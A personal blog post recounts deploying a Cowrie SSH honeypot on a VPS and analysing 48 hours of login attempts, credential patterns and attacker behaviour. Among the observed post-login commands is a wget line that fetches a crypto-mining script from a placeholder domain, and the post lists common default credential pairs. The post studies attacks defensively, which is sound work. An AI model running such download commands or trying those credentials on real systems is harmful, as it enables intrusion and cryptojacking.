---
layout: post
title: "My First Honeypot: 48 Hours of Internet Chaos"
date: 2025-06-10
tags: [honeypot, security, research]
excerpt: "Finally deployed my first honeypot this week. What I thought would be a simple 'set it and forget it' project turned into an eye-opening crash course in just how hostile the internet really is."
---

Finally deployed my first honeypot this week. What I thought would be a simple "set it and forget it" project turned into an eye-opening crash course in just how hostile the internet really is.

The numbers are staggering: 847 login attempts in the first 48 hours, from 23 different countries. But the real story is in the patterns, the persistence, and honestly... how personal some of these attacks feel.

<div class="ascii-header">
<pre>
██   ██  ██████  ███    ██ ███████ ██    ██ ██████   ██████  ████████ 
██   ██ ██    ██ ████   ██ ██       ██  ██  ██   ██ ██    ██    ██    
███████ ██    ██ ██ ██  ██ █████     ████   ██████  ██    ██    ██    
██   ██ ██    ██ ██  ██ ██ ██         ██    ██      ██    ██    ██    
██   ██  ██████  ██   ████ ███████    ██    ██       ██████     ██    
                                                                       
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
</pre>
</div>

### The Setup Journey

I chose Cowrie after researching honeypot options for about a week. The SSH/Telnet simulation looked solid, and the logging capabilities seemed comprehensive enough for what I wanted to learn.

Installation on my Ubuntu 22.04 VPS was smoother than expected:

```bash
sudo apt update && sudo apt install git python3-virtualenv
git clone https://github.com/cowrie/cowrie
cd cowrie
virtualenv --python=python3 cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip setuptools
pip install -r requirements.txt
```

<div class="methodology">
<h4>My Configuration Decisions</h4>
<p>Rather than use defaults, I spent time thinking through the config:</p>
<ul>
    <li><strong>Hostname:</strong> "server-prod-01" - generic enough to be believable</li>
    <li><strong>SSH version:</strong> OpenSSH_7.4 - slightly outdated to attract more attempts</li>
    <li><strong>Filesystem:</strong> Ubuntu 18.04 layout with realistic file structure</li>
    <li><strong>Services:</strong> Minimal running processes to seem like a real but poorly maintained server</li>
</ul>
</div>

### Reality Check: The First 48 Hours

Holy shit. I genuinely wasn't prepared for the volume or the... persistence.

Within 2 hours of going live, the first scan hit. By hour 6, I had consistent traffic. By day 2, I'm looking at attempts every 3-4 minutes during peak hours.

#### The Numbers That Hit Different
- **847 total login attempts** in 48 hours
- **23 unique source countries** (China, Russia, US leading)
- **156 different usernames** attempted
- **89 different passwords** tried
- **Longest session:** 23 minutes of active commands

### What Actually Surprised Me

#### The Creativity in Usernames
Sure, there's the predictable stuff: admin, root, user, test. But then you get attempts like "minecraft", "steam", "discord" - targeting gamers. Or "accounting", "reception", "manager" - clearly targeting small businesses.

Someone is thinking about psychology here, not just running dictionary attacks.

#### The Persistence Factor
One IP from Romania tried 47 different combinations over 6 hours. That's not automated spray-and-pray - that's someone actually sitting there, methodically working through possibilities.

It made me realize how personal this stuff can feel, even when you know it's just opportunistic scanning.

### Technical Insights

<div class="methodology">
<h4>Attack Pattern Analysis</h4>
<p>Most common credential combinations (in order):</p>
<ol>
    <li>root/123456</li>
    <li>admin/admin</li>
    <li>root/password</li>
    <li>user/user</li>
    <li>root/root</li>
</ol>
<p>But the interesting stuff happens after successful "login" to the honeypot...</p>
</div>

When attackers think they're in, their first commands tell a story:
- `whoami && id` - checking privileges
- `uname -a` - system reconnaissance
- `cat /proc/cpuinfo` - hardware assessment (crypto mining?)
- `wget http://[suspicious-domain]/miner.sh` - yep, crypto mining

### The Emotional Side Nobody Talks About

This is the part that caught me off guard. Watching the logs fill up in real-time... there's something visceral about seeing your server under constant attack attempts.

Even knowing it's just a honeypot, even knowing I set this up intentionally, there's this weird feeling of being hunted. Every few minutes, someone new is probing, testing, trying to break in.

It makes you realize how much trust we put in our security measures every day, and how many people are actively trying to break that trust.

### Methodology Moving Forward

This was just the beginning. Next steps in my honeypot journey:

<div class="methodology">
<h4>Analysis Pipeline</h4>
<ol>
    <li><strong>ELK Stack Setup:</strong> Elasticsearch, Logstash, Kibana for proper log analysis</li>
    <li><strong>GeoIP Integration:</strong> Better geographic attack visualization</li>
    <li><strong>Threat Intelligence:</strong> Cross-reference IPs with known threat feeds</li>
    <li><strong>Behavioral Analysis:</strong> Pattern recognition in post-login commands</li>
</ol>
</div>

### Honest Reflections

Setting up the honeypot was technically straightforward. The hard part is processing what you learn about the threat landscape.

Every attack attempt represents someone actively trying to compromise systems like mine. That's not theoretical anymore - it's documented, timestamped reality sitting in my log files.

It's motivating as hell for continuing down the cybersecurity path, but also sobering. This isn't just about technical skills anymore; it's about understanding adversary mindset and staying one step ahead of people who are very clearly not giving up.

Next week I'm expanding the honeypot network and diving deeper into the behavioral analysis. The internet is a wild place, and I'm just getting started understanding how wild. 